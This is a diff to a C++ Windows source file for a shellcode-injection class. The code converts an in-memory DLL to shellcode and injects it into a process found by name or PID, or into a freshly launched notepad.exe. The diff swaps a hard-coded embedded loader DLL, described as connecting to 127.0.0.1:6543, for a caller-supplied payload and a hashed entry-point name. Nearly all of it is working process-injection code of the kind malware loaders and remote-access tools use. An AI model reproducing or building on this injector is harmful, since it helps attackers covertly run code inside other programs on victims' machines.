@@ -4,9 +4,8 @@
 #include <string>
 #include <iostream>
 #include <tlhelp32.h>
-// A shell code loader connect to 127.0.0.1:6543.
-// Build: xxd -i TinyRun.dll > SCLoader.cpp
-#include "SCLoader.cpp"
+
+DWORD HashFunctionName(LPSTR name);
 
 BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID userData, DWORD userLength,
                         DWORD flags, LPSTR& outBytes, DWORD& outLength);
@@ -15,18 +14,28 @@ BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID
 class ShellcodeInj
 {
 public:
+    ShellcodeInj(BYTE* buf, int len, const char *func=0, LPVOID userData=0, DWORD userLength=0) {
+		m_buffer = buf;
+		m_length = len;
+        m_userFunction = func ? HashFunctionName((char*)func) : 0;
+        m_userData = userData;
+        m_userLength = userLength;
+    }
+
     // Return the process id if inject succeed.
     int InjectProcess(const char* processName = nullptr, bool hasPermission=false)
     {
+        if (m_buffer == NULL) return 0;
+
         if (processName) {
             auto pid = GetProcessIdByName(processName);
-            if (pid ? InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) : false)
+            if (pid ? InjectShellcode(pid, (BYTE*)m_buffer, m_length, m_userFunction, m_userData, m_userLength) : false)
                 return pid;
         }
         if (hasPermission) {
             auto pid = LaunchNotepadWithCurrentToken();
             if (pid) {
-                return InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) ? pid : 0;
+                return InjectShellcode(pid, (BYTE*)m_buffer, m_length, m_userFunction, m_userData, m_userLength) ? pid : 0;
             }
         }
 
@@ -37,11 +46,21 @@ public:
         if (CreateProcess(NULL, "\"notepad.exe\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
-            return InjectShellcode(pi.dwProcessId, (BYTE*)TinyRun_dll, TinyRun_dll_len) ? pi.dwProcessId : 0;
+            return InjectShellcode(pi.dwProcessId, (BYTE*)m_buffer, m_length, m_userFunction, m_userData, m_userLength) ? pi.dwProcessId : 0;
         }
         return 0;
     }
+
+    bool InjectProcess(int pid) {
+        return m_buffer ? InjectShellcode(pid, (BYTE*)m_buffer, m_length, m_userFunction, m_userData, m_userLength) : false;
+    }
+
 private:
+    BYTE* m_buffer = NULL;
+    int m_length = 0;
+    DWORD m_userFunction = 0;
+    LPVOID m_userData = 0;
+    DWORD m_userLength = 0;
     DWORD LaunchNotepadWithCurrentToken()
     {
         HANDLE hToken = NULL;
@@ -161,12 +180,13 @@ private:
         return hProcess;
     }
 
-    bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength)
+    bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength, 
+        DWORD userFunction, LPVOID userData, DWORD userLength)
     {
         if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
             LPSTR finalShellcode = NULL;
             DWORD finalSize;
-            if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, finalShellcode, finalSize)) {
+            if (!ConvertToShellcode(originBuffer, ulOriginalLength, userFunction, userData, userLength, 0x1, finalShellcode, finalSize)) {
                 return false;
             }
             compressedBuffer = new BYTE[finalSize];
@@ -181,7 +201,7 @@ private:
     }
 
     // Inject shell code to target process.
-    bool InjectShellcode(DWORD pid, const BYTE* pDllBuffer, int dllSize)
+    bool InjectShellcode(DWORD pid, const BYTE* pDllBuffer, int dllSize, DWORD userFunction, LPVOID userData, DWORD userLength)
     {
         HANDLE hProcess = CheckProcess(pid);
         if (!hProcess)
@@ -190,7 +210,7 @@ private:
         // Convert DLL -> Shell code.
         LPBYTE shellcode = NULL;
         int len = 0;
-        if (!MakeShellcode(shellcode, len, (LPBYTE)pDllBuffer, dllSize)) {
+        if (!MakeShellcode(shellcode, len, (LPBYTE)pDllBuffer, dllSize, userFunction, userData, userLength)) {
             Mprintf("MakeShellcode failed \n");
             CloseHandle(hProcess);
             return false;
